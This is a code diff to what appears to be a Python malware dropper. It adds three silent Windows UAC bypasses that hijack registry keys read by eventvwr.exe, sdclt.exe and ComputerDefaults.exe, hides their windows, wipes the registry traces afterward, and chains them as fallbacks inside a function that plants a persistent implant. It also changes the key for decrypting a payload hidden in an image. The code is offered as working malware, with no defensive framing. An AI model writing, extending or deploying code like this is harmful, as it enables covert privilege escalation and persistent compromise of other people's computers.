@@ -26,39 +26,136 @@ def is_admin():
     except Exception:
         return False
 
-def uac_bypass_fodhelper(payload_path):
+def uac_bypass_eventvwr(payload_path):
     """
-    Silent UAC bypass using fodhelper.exe (Windows 10/11).
-    No UAC prompt shown - completely silent.
-    Executes payload with admin rights.
+    COMPLETELY SILENT UAC bypass using eventvwr.exe (Event Viewer).
+    No UAC prompt, no windows, no GUI - 100% invisible.
+    Works on Windows 7/8/10/11.
     """
     try:
         import winreg
 
-        # Create the registry structure that fodhelper.exe reads
+        # eventvwr.exe tries to launch mmc.exe by reading this registry path
+        # We hijack it to execute our payload instead
+        reg_path = r'Software\Classes\mscfile\shell\open\command'
+
+        # Create the registry key hierarchy
+        try:
+            winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile\shell\open')
+        except Exception:
+            pass
+
+        # Set our payload as the command
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
+        winreg.CloseKey(key)
+
+        # Launch eventvwr.exe - it auto-elevates and executes our payload
+        # No Event Viewer window opens because our command executes first
+        subprocess.Popen(
+            'C:\\Windows\\System32\\eventvwr.exe',
+            shell=True,
+            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
+        )
+
+        # Give it time to execute
+        import time
+        time.sleep(2)
+
+        # Clean up registry traces immediately
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile\shell\open')
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile\shell')
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\mscfile')
+        except Exception:
+            pass
+
+        return True
+    except Exception:
+        return False
+
+def uac_bypass_sdclt(payload_path):
+    """
+    BACKUP SILENT UAC bypass using sdclt.exe (Windows Backup).
+    Completely invisible, no windows shown.
+    Works on Windows 10+.
+    """
+    try:
+        import winreg
+
+        # sdclt.exe reads from this registry path
+        reg_path = r'Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe'
+
+        # Create and set the hijack
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+        winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
+        winreg.CloseKey(key)
+
+        # Also need to set IsolatedCommand
+        reg_path2 = r'Software\Classes\exefile\shell\runas\command'
+        try:
+            winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile\shell\runas')
+        except Exception:
+            pass
+
+        key2 = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path2)
+        winreg.SetValueEx(key2, 'IsolatedCommand', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
+        winreg.CloseKey(key2)
+
+        # Launch sdclt - silent elevation
+        subprocess.Popen(
+            'C:\\Windows\\System32\\sdclt.exe',
+            shell=True,
+            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
+        )
+
+        import time
+        time.sleep(2)
+
+        # Clean up
+        try:
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe')
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path2)
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile\shell\runas')
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile\shell')
+            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\exefile')
+        except Exception:
+            pass
+
+        return True
+    except Exception:
+        return False
+
+def uac_bypass_computerdefaults(payload_path):
+    """
+    THIRD BACKUP - ComputerDefaults.exe bypass.
+    Silent execution, no GUI.
+    """
+    try:
+        import winreg
+
         reg_path = r'Software\Classes\ms-settings\shell\open\command'
 
-        # Create the key hierarchy
         try:
             winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
         except Exception:
             pass
 
-        # Set the command to execute our payload
         key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
         winreg.SetValueEx(key, '', 0, winreg.REG_SZ, f'pythonw.exe "{payload_path}"')
         winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
         winreg.CloseKey(key)
 
-        # Trigger fodhelper - it auto-elevates and reads our registry key
-        subprocess.Popen('C:\\Windows\\System32\\fodhelper.exe', shell=True,
-                        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
+        subprocess.Popen(
+            'C:\\Windows\\System32\\ComputerDefaults.exe',
+            shell=True,
+            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
+        )
 
-        # Wait a moment for it to execute
         import time
-        time.sleep(3)
+        time.sleep(2)
 
-        # Clean up the registry traces
         try:
             winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
             winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r'Software\Classes\ms-settings\shell\open')
@@ -171,7 +268,7 @@ def add_registry_persistence_user():
 def extract_payload_to_disk():
     """Extract the encrypted payload from the image and write to disk."""
     try:
-        divine_key = b'W7OjVGFA4Tq22NuT3Dnaw-h4jNEH8rKpgIeO3ulvgh0='
+        divine_key = b'EaOymE52dnkN1KB98DENr4lVUQ5V_dXRc1wFloE2C34='
 
         if hasattr(sys, 'frozen'):
             base_path = sys._MEIPASS
@@ -273,9 +370,13 @@ def sow_and_awaken_implant():
                     # User-level persistence as fallback
                     add_registry_persistence_user()
 
-                    # Trigger SILENT UAC bypass - fodhelper will execute with admin
-                    # This re-runs the payload with admin rights, hitting the if admin_mode branch above
-                    uac_bypass_fodhelper(PERSISTENT_PATH_USER)
+                    # Try multiple SILENT UAC bypasses - all completely invisible
+                    # Try eventvwr first (most reliable, no GUI)
+                    if not uac_bypass_eventvwr(PERSISTENT_PATH_USER):
+                        # If eventvwr fails, try sdclt
+                        if not uac_bypass_sdclt(PERSISTENT_PATH_USER):
+                            # Last resort: ComputerDefaults
+                            uac_bypass_computerdefaults(PERSISTENT_PATH_USER)
 
             # Launch user-level payload if not running
             implant_running = False
